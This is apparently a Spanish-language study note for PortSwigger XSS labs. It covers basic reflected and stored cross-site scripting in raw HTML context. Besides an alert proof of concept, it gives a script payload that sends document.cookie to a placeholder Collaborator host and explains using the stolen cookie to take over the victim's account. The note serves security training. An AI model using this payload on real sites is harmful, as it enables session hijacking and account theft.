---
aliases:
  - XSS 001 - reflected/stored básico + exfil de cookie
  - basic xss steal cookie
tags:
  - vuln/xss
  - example
  - portswigger
---

# 001 — Reflected/Stored básico → de PoC a robo de cookie

> Lab: [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) · [Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies) · **Apprentice/Practitioner** · técnica → [[vulnerabilities/002-xss/README|entry point]]

## ¿Por qué acá? (el caso base)
- **Es el punto de partida:** input reflejado (buscador) o guardado (comentario) que cae en **contexto HTML crudo, sin filtro**. Todo lo demás es este ataque + una complicación de contexto o filtro.
- **Reflected** vuelve en la respuesta → hay que **entregárselo a la víctima**. **Stored** se guarda en el comentario y **se dispara solo** cuando la víctima carga el post.
- El PoC (`alert`) solo confirma. El premio real es **robar la cookie de sesión** → session hijacking.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab).

Confirmá el reflejo en contexto HTML con el canario y luego el PoC:
<pre class="payload"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
Weaponizado — exfiltrar la cookie al Collaborator (stored en el comentario del blog):
<pre class="payload"><code>&lt;script&gt;fetch('https://<mark>COLLAB.oastify.com</mark>/?'+document.cookie)&lt;/script&gt;</code></pre>
Variantes de exfil (Image silenciosa, `location`, POST para datos largos) → [[exam/shortcuts/exfil-oastify|exfil-oastify]] · [[vulnerabilities/002-xss/exfil-payloads.js|exfil-payloads.js]].

## Verificación
El `alert` confirma el contexto. En Collaborator ves la interacción con la cookie de la víctima → cargás esa cookie en tu sesión y entrás a su cuenta.

## Detalles que se pasan por alto
- **`HttpOnly` bifurca:** si está en `true`, `document.cookie` **no la ve** → hay que actuar en la sesión (leer CSRF token + `fetch`) → [[vulnerabilities/002-xss/examples/004-httponly-leer-csrf-token-actuar|004]].
- Stored no necesita exploit server; reflected sí para entregarlo a la víctima.

→ Siguiente: [[vulnerabilities/002-xss/examples/002-breakout-atributo-string-js|002 · romper contexto de atributo o string JS]]
